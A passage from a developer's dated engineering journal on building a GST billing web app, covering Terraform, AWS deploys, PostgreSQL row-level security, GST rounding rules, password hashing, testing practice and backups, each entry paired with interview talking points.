  - **Open points go where they'll be read:** the GST edge case (two registrations in one state are CGST+SGST, not IGST) and the Day 5 dependency now sit on task P1.11.
- **Say it in an interview:** "Requirements get the same review as code. A reviewer with fresh context checks the written decisions against the owner's actual answers, because a note that drifts from what was agreed is a bug that ships."
- **Follow-ups to expect:** Why a fresh reviewer and not the author? (The author reads what they meant, not what they wrote. Someone without the chat history can only read the file.)

### 2026-11-18 — Terraform wanted to replace my stopped server `#devops` `#cloud` `#gotcha`
- **What happened:** A plan that only added four SSM parameters also said `aws_instance.server must be replaced`, with `associate_public_ip_address = false -> true # forces replacement`. The server was stopped. A stopped instance has no public IP, so AWS reports `false`, and Terraform saw a difference in an argument that can only be set at launch.
- **Why / what I learned:** Read the "forces replacement" line of every plan, even a small one. The fix was to drop the argument: the public subnet's `map_public_ip_on_launch` already gives the server its IP, and an argument left unset has nothing to drift from. Plan again and check it shows only what you meant (4 to add, 0 to change, 0 to destroy).
- **Say it in an interview:** "A plan is a diff, and the dangerous lines are the replacements. I caught one that would have rebuilt my server every time I planned while it was stopped, and fixed the code instead of starting the server to make the plan look clean."
- **Follow-ups to expect:** Why not `ignore_changes`? (It would hide real changes too. Not setting a value that the subnet already decides is simpler and leaves nothing to ignore.)

### 2026-11-18 — Secrets that Terraform creates but never sees `#security` `#devops` `#cloud`
- **What happened:** The server needs two database passwords and a DuckDNS token. The passwords are `ephemeral` random values written with `value_wo` (write-only). The token parameter is created with a placeholder through `value_wo`, and the owner overwrites it from their own PowerShell with `Read-Host -AsSecureString`, so it never appears in the chat, a shell history or Terraform state. I checked the state afterwards: every SecureString has `has_value_wo = true` and an empty `value`.
- **Why / what I learned:** A normal SSM parameter resource reads its value back on every refresh, so even a value typed in by hand would end up in state. Write-only arguments are the only way to let Terraform own the parameter but not the secret.
- **Say it in an interview:** "Terraform owns the parameter, the person owns the secret. The token goes straight from the owner's keyboard into SSM, and the state file only knows the parameter exists."

### 2026-11-18 — Deploying by commit hash, with no SSH `#devops` `#cloud` `#security` → ADR 0034
- **What happened:** The `images` workflow builds both images on GitHub's free ARM64 runner on every push to `main` and pushes them to GHCR tagged with the commit. A deploy script sends a Systems Manager Run Command: the server downloads the repo at exactly that commit, installs the deploy files, creates the database roles once, and restarts a systemd service. At every boot that service updates DuckDNS, reads the passwords from SSM into root-only files in memory, and starts the stack.
- **Why / what I learned:**
  - **No long-lived push credential:** the workflow's own token expires with the job. My laptop's token can't push packages, and that's how I want it.
  - **One commit hash names everything that runs:** the deploy files and both images.
  - **`set -e` doesn't see failures inside `$(…)` used as an argument.** `printf '%s' "$(read_password)"` would write an empty password and carry on; reading into a variable first stops the script.
  - **Never put a secret on a command line,** where any user can read it in the process list: the DuckDNS token goes to curl on stdin (`-K -`), and passwords go to Docker as bare `-e NAME`.
  - **TLS to the database checks the certificate** (`sslmode=verify-full` with Amazon's certificate bundle), not just encryption.
- **Say it in an interview:** "Each merge produces images tagged with its commit, and a deploy is 'run commit X': the server fetches that commit's files and images over Systems Manager. There's no SSH port, no push token on a laptop, and the database connection verifies the server's certificate."
- **Follow-ups to expect:** Why GHCR and not ECR? (The images are public and free on GHCR; ECR bills storage and needs an AWS role for GitHub. With private images I'd move to ECR and pull with the instance role.)

### 2026-11-18 — RDS's admin isn't a superuser `#database` `#cloud` `#gotcha`
- **What happened:** The roles script runs as the local superuser everywhere else, but on RDS the master user only has `rds_superuser`. From PostgreSQL 16, a non-superuser can create a database owned by another role only if it may `SET ROLE` to it. The script now grants `app_owner` to the admin `WITH INHERIT FALSE, SET TRUE`, and also stops the app roles connecting to the admin's own database.
- **The review caught what my tests couldn't:** they ran the script as a superuser, which can do anything. Run as a non-superuser admin (as on RDS), three statements changed nothing, and PostgreSQL only printed a WARNING, so the app database stayed open to every role. The fix runs every change to `app_owner`'s objects under `SET ROLE app_owner`, also grants the admin CONNECT (or it locks itself out), and sets passwords in separate `ALTER ROLE` statements so a failed `CREATE ROLE` can't log one. A new test runs the script as a `CREATEROLE CREATEDB` role and fails on any WARNING (red first).
- **Lesson:** test as the user that will really run it. A superuser in tests hides permission bugs, and `ON_ERROR_STOP` doesn't stop on warnings.
- **Say it in an interview:** "Managed databases don't give you a superuser, so bootstrap scripts written against local Docker need checking. I gave the admin the right to switch into the owner role on purpose, without inheriting its rights automatically."

### 2026-11-18 — The GST engine: one function, every number on the bill `#gst` `#money` `#testing`
- **What happened:** P1.12 built `calculateBill` in `packages/shared`: it takes a cart (price, quantity, GST rate, HSN, tax-inclusive or not, item and bill discounts, the seller's state and the place of supply) and returns each line's taxable value and tax, the totals, a round-off line, and summaries by rate and by HSN code. The billing screen, the server's check on save, the printed bill and the CA's GST export will all call the same function. It also lists Indian states with their GST state codes, which signup uses too.
- **Why / what I learned:**
  - **GST is charged after the discount** (CGST Act s. 15(3)(a)): a discount shown on the invoice isn't part of the taxable value.
  - **CGST and SGST are two separate taxes at half the rate each,** so each is worked out on its own and they are always equal. Working out 18% and splitting it would give 9.01 + 9.00 on odd paise.
  - **A tax-inclusive (MRP) price must never cost the customer a paisa more.** So the engine takes the tax out of the price (price × rate ÷ (100% + rate)) and leaves the odd paisa in the taxable value. On the same line, IGST can differ from CGST + SGST by a paisa, and that's correct.
  - **A bill discount is shared across the lines by the largest remainder method:** every share is rounded down, then the leftover paise go to the shares with the biggest remainders. The shares always add up to the discount exactly. A percent bill discount is worked out once on the subtotal (10% of ₹9.99 is ₹1.00; 10% of three ₹3.33 lines separately is only ₹0.99). A rupee bill discount means the customer pays exactly that much less (the next entries tell how that was settled).
  - **Rounding happens per line, and every total is a sum of lines,** so the lines, the totals and the HSN summary can never disagree.
  - **Union Territories without a legislature charge UTGST,** not SGST (Chandigarh, Ladakh, Lakshadweep and others). Delhi and Puducherry have legislatures, so they keep SGST.
  - **No floats, and BigInt for every product,** so even a huge quantity × price can't lose precision; anything past 2^53 paise is refused, not rounded.
- **Say it in an interview:** "I put all GST maths in one pure, heavily tested function shared by the browser and the server, so the screen, the saved bill and the printout always agree to the paisa. The interesting parts were the legal ones: GST after discount, CGST and SGST computed separately so they're equal, and an inclusive price that never charges more than MRP."
- **Follow-ups to expect:** Why per-line rounding and not per-invoice? (Rule 46 invoices show tax per item, and per-line figures that add up to the totals mean no reconciliation paisa anywhere.) How do you split ₹1 three ways? (Largest remainder: 34, 33, 33 paise, earliest line first on a tie.)

### 2026-11-18 — Proving tests can fail by planting bugs `#testing` `#process`
- **What happened:** All 599 tests passed on the first run of the GST engine, which proves nothing on its own. So I planted five bugs one at a time: rounding down instead of half up, treating inclusive prices as exclusive, no UTGST, no round-off, and no cap on a discount. Each one turned tests red (222, 187, 6, 365 and 1 failures), and the restored code went green again.
- **Why / what I learned:** a test that has never failed may not be testing anything. This is a small, manual form of **mutation testing** (tools like Stryker automate it). Besides hand-checked tables, 400 random carts from a seeded generator check rules that must always hold: totals equal the sum of lines, an inclusive line costs exactly its price, CGST equals SGST, and the round-off stays between −49 and +50 paise. The seed makes a failure reproducible, so there was no need for a property-testing library.
- **Say it in an interview:** "When tests pass first time, I break the code on purpose to prove they can fail. For the GST engine I did that with five planted bugs, and I added invariant checks over hundreds of seeded random bills on top of the hand-worked examples."
- **Follow-ups to expect:** Why seeded random data and not fast-check? (No new dependency for one test file, and the same carts run every time; fast-check would add shrinking to a minimal failing case, worth it if these tests ever fail in a hard-to-read way.)

### 2026-11-18 — "₹10 off" has to mean the customer pays ₹10 less `#gst` `#requirements` `#testing` `#mistake`
- **What happened:** A fresh-context review of the GST engine's PR found that a rupee bill discount was shared in each line's own price basis. On a tax-exclusive bill, "₹10 off" took ₹10 off the taxable value, so the customer paid ₹11.80 less (₹10 plus its 18% tax); on a mixed bill, ₹20 off became ₹21.66. The bill-level "amount" also added tax-inclusive and tax-exclusive prices together, so the printed bill couldn't add up. The owner decided: **₹X off the bill means the customer pays exactly ₹X less.** The review also found that a composition or unregistered business was allowed to sell to another state, which the law forbids, and that untyped input such as `priceIncludesTax: "false"` (a string, so truthy) was quietly treated as tax-inclusive.
- **Why / what I learned:**
  - **Discount numbers need a stated meaning.** The engine now shares ₹X by what the customer pays for each line (tax included), and prices each discounted line at its old payable minus its share, taking the tax out of that. Every line's total drops by exactly its share, so the bill drops by exactly ₹X; 400 random carts check it.
  - **One meaning per field.** The bill now has `gross` (no discounts), `subtotal` (after item discounts), `billDiscount` (how much less the customer pays) and `total`, all tax included, plus `taxable` and the taxes. gross − item discounts − bill discount = total = taxable + taxes.
  - **An exact price with equal halves has a cost:** a printed CGST can be 1 paisa off 9% of the printed taxable value. That bound is now written down and tested, not hidden.
  - **Run-time checks for untyped callers:** the server receives JSON, so a TypeScript type guarantees nothing there. `priceIncludesTax` must be a real boolean, and HSN codes must be 4, 6 or 8 digits on a tax invoice.
  - **Law as validation:** CGST Act s. 10(2)(c) bars composition dealers from inter-state supplies, and s. 24(i) makes an inter-state seller of goods register. The engine refuses those bills.
- **Say it in an interview:** "My GST engine passed 599 tests, and a reviewer still found that '₹10 off' made the customer pay ₹11.80 less on a tax-exclusive bill. The maths was consistent; the meaning was wrong. I took the question to the owner, encoded the answer as an invariant ('the payable drops by exactly X') and checked it over hundreds of random bills."
- **Follow-ups to expect:** How can a discount be exact when tax rounds? (Treat the discounted line's new price as tax-inclusive: the customer's price is fixed, the tax is taken out of it, and any odd paisa stays in the taxable value.) Why not just trust the TypeScript types? (They vanish at run time; anything from the network is `unknown` until checked.)

### 2026-11-18 — A tax invoice line must add up before tax, too `#gst` `#testing`
- **What happened:** A second review of the GST engine checked the ₹-discount fix on 30,000 random carts and found it right, but found a printing gap: on a tax-exclusive line the amount and item discount were before tax while the bill-discount share was tax-included, so "₹100 − ₹5 − ₹10" didn't equal the printed taxable ₹86.52. A tax invoice must show each item's value, discount and taxable value before tax (CGST Act s. 15(3)(a), Rule 46).
- **Why / what I learned:** Every line now also carries its value before tax and its total discount before tax, and value − discount = taxable on every line. Rounding the two tax halves separately can raise a tiny inclusive line's taxable value by a paisa when it's discounted, so the discount could have come out as −1 paisa; the value before discounts is raised with it instead, so a printed discount is never negative. A brute force over 189,995 small lines confirmed it.
- **Say it in an interview:** "A customer receipt and a tax invoice need different views of the same numbers: what the customer saved, tax included, versus value and discount before tax. I gave each line both, and tested that each view adds up on its own."

### 2026-11-18 — Passwords hashed with Argon2id from Node's own crypto `#security` `#backend` → ADR 0035
- **What happened:** Signup now takes a password. It is hashed with Argon2id using `crypto.argon2`, which Node 24 has built in, with OWASP's minimum settings (19 MiB of memory, 2 passes, 1 lane) and a 16-byte random salt. The result is stored as a PHC string (`$argon2id$v=19$m=19456,t=2,p=1$salt$hash`), so the settings travel with each hash. A test checks the function against the official RFC 9106 test vector.
- **Why / what I learned:**
  - **A password hash must be slow on purpose.** SHA-256 is built to be fast, so a stolen table can be guessed billions of times a second. Argon2id makes every guess cost memory, which graphics cards don't have much of per core.
  - **The PHC string lets the settings change later.** Verifying reads the settings from the stored hash; P1.4 can rehash at login when the settings go up.
  - **Compare hashes with `timingSafeEqual`,** so the time taken doesn't reveal how many bytes matched.
  - **A built-in beats a native package:** no compiled `argon2` addon to break on Alpine or ARM images.
- **Say it in an interview:** "Passwords are Argon2id with OWASP's settings, stored as PHC strings so I can raise the cost later and rehash at the next login. I tested it against the RFC's own test vector rather than trusting that my wrapper was right."
- **Follow-ups to expect:** Why not bcrypt? (It truncates at 72 bytes and only costs CPU time; Argon2id is the current OWASP first choice.) Why no symbol rules? (NIST 800-63B: length helps, forced symbols lead to `Password1!`. The rule is 10+ characters, not the email or phone.)

### 2026-11-18 — Every API route must say who may call it `#security` `#backend` `#testing` → ADR 0036
- **What happened:** A global guard refuses any route that has neither `@Public()` nor `@Permission('...')`: it fails with a 500 instead of quietly letting everyone in. A "route census" test lists every controller method and checks each one has exactly one of the two, and that every request body goes through a Zod pipe. Request bodies are checked with the same Zod schemas the web forms use, from `packages/shared`, and errors are codes (`required`, `state_mismatch`), never sentences; each screen turns a code into words in English, Hindi or Hinglish.
- **Why / what I learned:**
  - **Fail closed.** Forgetting a decorator should break loudly in a test, not open a route to everyone.
  - **One schema, two places.** The form and the API can't disagree about what a valid GSTIN is, because there is only one definition.
  - **Codes, not messages, cross the wire,** so the API doesn't need to know the user's language.
  - **Gotcha:** Zod's `superRefine` runs even when a field's own check failed, so a malformed PAN also reported "GSTIN doesn't match the PAN". The cross-field checks now compare only values that passed their own checks.
- **Say it in an interview:** "Authorization is opt-out-proof: a route without a declared permission can't be served, and a test counts every route to prove it. Validation is one Zod schema shared by the React form and the NestJS API, returning codes the UI translates."
- **Follow-ups to expect:** How does the API know who's calling before login exists? (A `SessionResolver` interface; until P1.4 it never finds anyone, so owner routes answer 401.) Why 401 and not 403? (401: we don't know who you are. 403: we know, and you can't.)

### 2026-11-18 — A unique email across every business, with Row-Level Security on `#database` `#security` `#gotcha`
- **What happened:** Owner emails must be unique across all businesses (login is by email). But RLS means a query only sees its own business's rows, so "check if the email exists, then insert" can't see other businesses, and would race anyway. A partial unique index, `users (email) where role = 'owner'`, does it: PostgreSQL checks unique indexes against every row, whatever the policies say. A duplicate fails with error `23505` on that named constraint, which the API turns into `409 email_taken`.
- **Why / what I learned:** Constraints are enforced below RLS, so they're the safe way to check something across tenants without a privileged function. The database settles the race too: two signups with one email at the same moment give one 201 and one 409, and a test does exactly that.
- **Say it in an interview:** "I let the database enforce uniqueness instead of checking first in code. That's race-free, and it works across tenants even with Row-Level Security, because unique indexes see every row."
- **Follow-ups to expect:** Doesn't the 409 reveal that an email is registered? (Yes, as on most signup pages, and #27 accepts it. P1.4's rate limit makes checking emails one by one slow; it can't stop someone with many IP addresses, so it slows a list-builder down rather than blocking one.)

### 2026-11-18 — The recovery key is shown once and kept only in memory `#security` `#frontend`
- **What happened:** Signup returns a 32-character recovery key (20 random bytes in Crockford base32, which avoids look-alike letters such as I, L, O and U). The database keeps only its SHA-256. The web app holds the key in a JavaScript variable, never in the URL, `localStorage` or `sessionStorage`, and a test checks all three. After a reload the screen says the key is gone, by design. The owner can print it (the printout says which business and when) or copy it, and must tick "I have written down or printed this key" before continuing.
- **Why / what I learned:** Anything the browser saves can be read later by whoever sits at the counter computer. A key that exists only on paper and as a hash can't leak from the app. A plain SHA-256 is enough here, unlike passwords, because the key is 160 random bits: there's nothing to guess.
- **Say it in an interview:** "The recovery key is like a GitHub recovery code: shown once, stored as a hash, never written to browser storage. A slow hash isn't needed because the key is random, not chosen by a person."
- **Follow-ups to expect:** What if the response is lost before the owner sees the key? (The account exists but the key was never seen; P1.4 adds "make a new key" after login.)

### 2026-11-18 — Small front-end gotchas while building signup and settings `#frontend` `#gotcha` `#accessibility`
- **What happened:**
  - **Radix's `Slot` always merges `aria-describedby`,** so a tooltip on a button that already has a visible name made screen readers read the name twice. The tooltip now wraps such buttons in a span and puts its trigger there.
  - **TanStack Router marks a link active for every path under it,** so "Home" (`/`) was highlighted on `/settings` too. Home now uses `activeOptions={{ exact: true }}`, and a test checks `aria-current`.
  - **React Compiler skips a component that calls React Hook Form's `watch()`.** `useWatch` gives the same value in a form it can optimise.
  - **The locale test caught Hindi labels with no Hindi in them** ("PAN", "GSTIN"); they're now "PAN नंबर" and "GSTIN नंबर".
  - **The route generator treated `*.test.tsx` next to a page as a route.** A `routeFileIgnorePattern` keeps tests beside their pages.
- **Say it in an interview:** "I test accessibility with the same queries a screen reader uses, by role and accessible name, so a label read twice or a wrong `aria-current` fails a test instead of slipping through."

### 2026-11-19 — One mailbox, many spellings: look-alike emails `#security` `#database` `#gotcha`
- **What happened:** The PR review signed up `owner@example.com`, then signed up again with a zero-width space in front, a soft hyphen inside, a fullwidth o (U+FF4F) and a Cyrillic o (U+043E). Every one got a 201: a second owner account for what a person reads as the same address. The unique index compared exact strings, and none of those characters is a space, so trimming and lower-casing let them through. Emails are now printable ASCII only (`^[!-~]+$`), in the shared Zod schema and in the database's CHECK (migration 0004). Names on bills now refuse Unicode's invisible "format" characters too, such as the right-to-left override that makes text display backwards, but keep the two joiners Devanagari needs.
- **Why / what I learned:** "Unique" only means what the comparison means. Text that looks the same can be different bytes, and copy-paste from chat apps brings invisible characters along. For an identifier like a login email, choosing a narrow alphabet is simpler and safer than trying to normalise every look-alike.
  - **Gotcha:** the tool that wrote these tests turned the escapes (`\u200B`) into the real invisible characters, so the test files looked fine but tested something no reviewer could see. A small script that lists every format character in the changed files found them, and the tests now spell each one as an escape.
- **Say it in an interview:** "A uniqueness rule is only as strong as its idea of 'the same'. I restricted login emails to printable ASCII in both the API schema and a database CHECK, so look-alike letters and invisible characters can't create a second account for one mailbox."
- **Follow-ups to expect:** Doesn't that block international email addresses? (Yes. The shop owners this is for use Gmail-style addresses, and Gmail doesn't allow non-ASCII either. If needed later: normalise with NFKC and refuse mixed scripts.)

### 2026-11-19 — Tests that pass for the wrong reason `#testing` `#mistake`
- **What happened:** Two of my new tests passed before the fix existed. The first checked that the database refuses a branch in state 97, but an earlier test had left a GSTIN starting with 27 on that branch, so the GSTIN check refused the row instead. The second checked that reordering features writes no entry-log row, but it sent the order already stored, so it would pass with or without the fix. Both now set things up so only the rule under test can make them pass, and I watched each one fail without the fix. The review also claimed Zod counts a password's length in UTF-16 units (five emoji = 10). A two-line probe showed Zod 4 counts characters, so that finding was dropped and the test kept as a pin.
- **Why / what I learned:** A test that has never failed hasn't proved anything. Run it against the old code first. If it passes there, the setup is wrong, not the code. The same goes for a review's claims: check them before changing code.
- **Say it in an interview:** "Red first, every time: I run a new test against the unfixed code and make sure it fails for the reason I expect. Twice in one review that caught a test passing because of leftover data or a no-op input."

### 2026-11-19 — The real-app check, and what tests missed `#frontend` `#testing` `#accessibility`
- **What happened:** Clicking through signup in Chrome, in English, Hindi and Hinglish, light and dark, found three things the tests didn't:
  - An empty radio group or state list said only "Check this". There's now a "Choose one" code. React Hook Form sends `null` for a radio group with nothing picked, so the schema treats null, `''` and missing as "choose".
  - At 1024 px the form stacked below the sales pitch. Tailwind's `lg` starts at 1024 px, and a 1024 px screen loses about 15 px to the scrollbar, so the two columns now start at 960 px.
  - Back from the recovery-key screen, then Forward, showed the key again. The signup page now forgets the key when it opens.
  The same check confirmed what tests can't: the password is stored only as an Argon2id hash, the server log holds no email, phone, password or key, a forced database failure logs only the cause, and the strict CSP reports nothing.
- **Why / what I learned:** Unit tests check what I thought of. Using the real app at the shop's screen size, with the real CSP, finds what I didn't.
- **Say it in an interview:** "Before merging a feature I use it the way a shop owner would, at their screen size and in their language, and I read the server log and the database while I do. It found three bugs the 1,000 tests didn't."

### 2026-11-19 — The live site after a stop and start, and three deploy gotchas `#devops` `#cloud` `#gotcha`
- **What happened:** After the first deploy, I stopped and started the server to test the nightly routine. It came back with a new public IP; `start.sh` told DuckDNS, and the site answered over HTTPS 73 seconds after boot, with the same Let's Encrypt certificate (Caddy keeps it in a Docker volume). Pages load in about 0.12 s from India. Three gotchas on the way:
  - **DuckDNS answered `KO`:** the token in SSM had the right shape, a 36-character UUID, but wasn't the account's token. Re-entering it fixed it. A shape check can't tell you a secret is the right one; only the service can.
  - **The images were public without anyone switching them:** ADR 0034 said a new GitHub package starts private. The ones our public repo's workflow pushed came out public, and the server pulled them with no login. The ADR now says so.
  - **The deploy script crashed after a successful deploy,** printing the server's output: the AWS CLI on Windows writes in the cp1252 code page, which has no `→`. `PYTHONUTF8=1` fixes it for the CLI. My first fix printed through `python -I`, which ignores every `PYTHON*` variable, so it still crashed when piped; the PR review caught it, and `-X utf8` fixes ours.
- **Why / what I learned:** Test the routine you'll actually run (stop, start, new IP), not just the first deploy. And when a doc predicts how a service behaves, check it against what happened and correct the doc.
- **Say it in an interview:** "I proved the restart path: a stopped server comes back on a new IP, updates its DNS name and serves HTTPS again in about a minute, without me touching it."

### 2026-11-19 — "Works on my machine" because of a leftover build `#testing` `#devops` `#mistake`
- **What happened:** Every CI run on the signup PR failed while `pnpm check` passed on my laptop. The database package had started importing the shared package, but its test config lacked the `source` condition that tells Vite to read the shared package's TypeScript files. Without it, Vite looks for the built `dist/`, which my laptop had from an earlier build and CI never builds before testing. Moving `dist/` aside reproduced the failure in one command; one config line fixed it.
- **Why / what I learned:** A local pass can depend on files that git doesn't track: build output, caches, a running container. When CI and my laptop disagree, the first question is "what does my machine have that a clean checkout doesn't?". Also, I had merged nothing yet but had ignored the red CI on earlier pushes: read CI on every push, not just before merge.
- **Say it in an interview:** "CI failing while local passes usually means local state. I reproduce CI's clean slate by moving build outputs aside, and that found it in a minute: a test config resolving a workspace package to its build instead of its source."

### 2026-11-18 — Updating a branch without rewriting it `#git` `#process`
- **What happened:** Two lanes needed `main`'s new commits. Rebasing would have rewritten their published commits and needed a force push, which the project allows only with the owner's OK. For the GST engine branch I merged `main` into it instead: the files ended up identical to the rebased version, the branch's history stayed as published, and a normal push worked. The one rewrite we did (removing a test value gitleaks flagged) was approved first, used `--force-with-lease` and kept a local backup branch.
- **Why / what I learned:** With squash merges, a branch's own history is thrown away at merge time anyway, so a merge commit on it costs nothing, and it never invalidates what others may have pulled.
- **Say it in an interview:** "On a branch others can see, I merge `main` in rather than rebase. With squash merges the result on `main` is identical, and nobody's copy of the branch breaks."

### 2026-11-19 — Requirements decided in one sitting, and two ideas they carry `#process` `#database` `#design`
- **What happened:** In fast-track sitting 2 the owner answered 17 items plus 7 design questions from the P1.7 Items lane in about an hour, taking the recommendation each time except two explicit choices: commission on sales moved out of v1, and only three of four entry-log flag rules kept. Modules 05, 06 and 07 became DECIDED. One answer (G1) changed mid-sitting because a parallel lane found the original plan, checking each HSN code's GST rate, needed a government table with thousands of rows that changes by notification.
- **Why / what I learned:** Two ideas worth naming. (1) *Database-enforced history:* with column-level INSERT grants, the app's role can't supply an entry log row's ID or time, so history can't be backdated, not just not edited or deleted (D4). The cost is honest: seeded demo history all carries the seed date, so flag rules count by the business date stored in the row. (2) *Idempotency:* the daily WhatsApp summary is recorded once per business per day, so a worker restart (every deploy) or a server that was off at 21:30 never sends a duplicate; on start it sends only the latest missed one.
- **Say it in an interview:** "The audit log is append-only and the database stamps the time, so even a bug in the app can't backdate history. Scheduled messages are idempotent: one per business per day, recorded, so restarts and catch-ups never double-send."

### 2026-11-19 — A guard rule that silently checked nothing `#testing` `#database` `#gotcha`
- **What happened:** P1.7 extended the tenancy guard so an append-only table's partitions are append-only too. I wrote the rule with `pg_partition_tree(table)`, expecting it to list the table itself. It does, for a partitioned table. For an ordinary table it returns **no rows**, so the rule stopped checking `entry_log` at all, and the real schema still passed. The guard's probe tables caught it: the two deliberately broken append-only probes were no longer reported. The rule now checks the named table and its partitions.
- **Why / what I learned:** A safety check that passes is only proof if it can also fail. That's why every guard rule has a broken probe that must be reported: when I broke the rule, the probes failed, even though the real schema "passed".
- **Say it in an interview:** "My schema guard proves itself: each rule has a deliberately broken table it must flag. When I rewrote one rule, the real schema still passed, but the probes didn't, and that showed me the new query had stopped checking the table it was meant to protect."

### 2026-11-19 — Unique keys leak across tenants unless they include the tenant `#security` `#database`
- **What happened:** P1.7 added a guard rule: every unique constraint or index on a tenant table must include `business_id`. A unique index sees every row, even ones RLS hides, so `unique (code)` on items would make one shop's item code collide with another's, and the error would tell the second shop the code exists. Item names, short codes, barcodes and category names are all unique per business (`(business_id, lower(name)) where archived_at is null`). The one deliberate exception, the owner email, is listed with its reason.
- **Why / what I learned:** Row-Level Security filters what queries return, not what constraints check. Constraints are a side channel between tenants unless they're scoped.
- **Say it in an interview:** "RLS hides rows from queries, but unique indexes still see them, so an unscoped unique key leaks existence across tenants. My guard test fails CI on any unique key without the tenant column."

### 2026-11-19 — Two counters editing one item: optimistic locking `#backend` `#database`
- **What happened:** Items carry a `version`. The form sends back the version it read; the server locks the row and answers `409 stale` if someone saved in between, so the second save can't silently undo the first. Two counters adding the same barcode at once are settled by the partial unique index (one 201, one 409), and two asking for a new in-store barcode take turns on a row lock on the business, so they get different numbers. All three have concurrency tests.
- **Why / what I learned:** "Last write wins" was fine for settings, which one owner edits. Prices are edited often, from more than one counter, and a lost price change is a lost sale or a wrong bill.
- **Say it in an interview:** "I use optimistic locking with a version column for edits a person makes from a form, and a row lock only for the short critical section that hands out the next number."

### 2026-11-19 — `ORDER BY 0` isn't a constant `#database` `#gotcha`
- **What happened:** The item list orders by a search rank (exact code first, then names starting with the term). With no search term the rank was the literal `0`, and every list request failed: in PostgreSQL an integer literal in `ORDER BY` means "the Nth column", and there is no column 0. `0::int` is an expression, so it sorts as a constant.
- **Say it in an interview:** "A plain number in ORDER BY is a column position in SQL, not a value. I found it when an empty search failed and an integration test showed the error."

### 2026-11-19 — Sorting Hindi and English item names the same everywhere `#database` `#frontend`
- **What happened:** A shop's items mix English and Hindi names and numbers ("Atta 2 kg", "Atta 10 kg", "आटा"). Sorting by bytes puts 10 before 2, and glibc's locale rules differ between my Docker image and RDS. I created an ICU collation, `item_name` (`und-u-kn-true`: Unicode's root order, numbers by value), checked its order on PostgreSQL 18.6 and pinned it in a test. ICU collations are versioned, so the same version sorts the same everywhere; RDS still has to be checked when it next runs.
- **Say it in an interview:** "For user-facing sorting I use a versioned ICU collation, not the OS locale, so my laptop, CI and RDS agree, and numbers inside names sort by value."

### 2026-11-19 — A valid final state can still break a unique index half-way `#database` `#bug` `#review`
- **What happened:** A code review of P1.7 found that saving an item's packs could fail with `409 duplicate_pack` even when the final set was valid: swapping two packs' units (box ↔ pack), or adding a new "box" listed before the old box was changed to "dozen". PostgreSQL checks a unique index on every row as it's written, so the order of the writes mattered. A deferrable constraint would check at commit instead, but a *partial* unique index (live rows only) can't be deferred. The fix "parks" every pack whose unit changes (archives it, which takes it out of the index) in one statement, then writes each pack live again, then adds the new ones. Two tests cover the swap and the move.
- **Why / what I learned:** "Each step is valid" and "the end result is valid" are different promises. Unique checks are per statement (per row for an index), so multi-row edits need an order that never passes through a duplicate, or a temporary state the index ignores.
- **Say it in an interview:** "A unique index is checked as each row is written, not at the end. When a save could swap values between rows, I first move the changing rows out of the index's scope, then write the final values, so any valid end state saves in any order."

### 2026-11-19 — Don't infer "we made this" from what a value looks like `#backend` `#bug` `#review`
- **What happened:** In-store barcodes are EAN-13s starting with 2, and the code marked any 2-prefixed EAN-13 as in-store. But weighing scales print 2-prefixed codes too, so a typed one counted as ours, and typing the highest possible one made "make the next code" fail forever (a permanent 500). Now `in_store` is true only when the server generated the code, and generation skips any code already used.
- **Say it in an interview:** "Provenance is a fact you record when something happens, not something you guess later from its shape. My review caught a flag derived from a pattern that outside data could also match."

### 2026-11-19 — Backups when no role may bypass row-level security `#database` `#security` `#devops` `#decision`
- **What happened:** The approved stage 7 plan said "pg_dump as the RDS master user". Before writing it, I checked what that user can do: AWS's own role listing shows "Bypass RLS" only on `rdsadmin`, AWS's internal superuser, and since PostgreSQL 16 only a role that has `BYPASSRLS` can give it. My tenant tables `FORCE` RLS, so the master would get "query would be affected by row-level security policy". Instead there's a read-only role `app_backup` (SELECT only, every transaction READ ONLY), and every tenant table gets a second policy, `backup_read`: `FOR SELECT TO app_backup USING (true)`. `pg_dump --enable-row-security` as that role then sees every business. ADR 0037, accepted by the owner the same day.
- **Why / what I learned:** That flag is the exact trap ADR 0027 warned about: a table without the policy is dumped *empty* and pg_dump still exits 0. So two locks: the tenancy guard test fails CI for a tenant table without the exact policy (and for any write right on `app_backup`, or any role that could use it), and `dump.sh` refuses to run on a live database where one is missing. Check a plan's assumptions against the platform before building on them.
- **Say it in an interview:** "Managed Postgres doesn't give you a superuser, so a backup can't simply bypass row-level security. I gave a read-only backup role its own read-everything policy on every table, and made CI fail if a table forgets it, because the failure mode of this design is a silently empty table."
- **Follow-ups to expect:** Why not one policy that checks `current_user`? (Two separate permissive policies keep the tenant policy byte-for-byte what the guard pins, and the backup one is visible and checkable on its own.) Doesn't this widen access? (Only for a role that can't write, that no other role inherits, and whose password only the nightly job reads.)

### 2026-11-19 — A backup you've never restored isn't a backup `#devops` `#database` `#testing`
- **What happened:** The nightly job dumps the database and counts every table's rows **in the same snapshot** (a REPEATABLE READ transaction exports its snapshot; `pg_dump --snapshot` uses it from inside psql's `\!`), so the counts match the dump exactly even while the shop is billing. The restore drill restores into a throwaway container and compares every count. The same scripts run in CI (Testcontainers): two businesses dumped as `app_backup`, restored into a second PostgreSQL, counts compared; a changed count, a table without its policy, and a schema the role can't read each make it fail. Two bugs found that way: `pg_dump --schema=public` writes `CREATE SCHEMA public`, which fails on restore (so it dumps the whole database), and Python ate the line continuations in a shell script I edited.
- **Why / what I learned:** "Restore exited 0" proves nothing when an empty table restores fine. Row counts from the dump's own snapshot are the cheapest check that every row came back.
- **Say it in an interview:** "My restore drill is a CI test: every push dumps a database with two tenants, restores it into a fresh Postgres and compares every table's row count with counts taken in the dump's own snapshot."

### 2026-11-19 — The server can add backups but never read or delete them `#cloud` `#security` `#devops`
- **What happened:** The server's IAM role has one S3 right on the backup bucket: `s3:PutObject` under `postgres/`. No GetObject, ListBucket or DeleteObject, and the bucket is versioned, encrypted, TLS-only, with public access blocked and a lifecycle (90 days, then 30 as older versions). The restore drill still runs on the server: the laptop, signed in as admin, makes two pre-signed links that work for 15 minutes and passes them through Run Command. The nightly timer runs at 22:45 IST with `Persistent=true`, because the server is usually off by then: a missed night runs at the next boot, and since nothing changes while everything is stopped, that copy is the end of the last session.
- **Why / what I learned:** Least privilege applied to backups means an attacker on the server can't destroy or read the history (the ransomware case). And a schedule must match how the machine actually runs, not how a server "normally" runs.
- **Say it in an interview:** "The machine that makes backups can only add them. Reading one for a drill goes through a short-lived pre-signed link I create as admin, so a compromised server can't wipe or exfiltrate the backup history."

### 2026-11-19 — "Insufficient capacity": a stopped server isn't a reserved server `#cloud` `#gotcha`
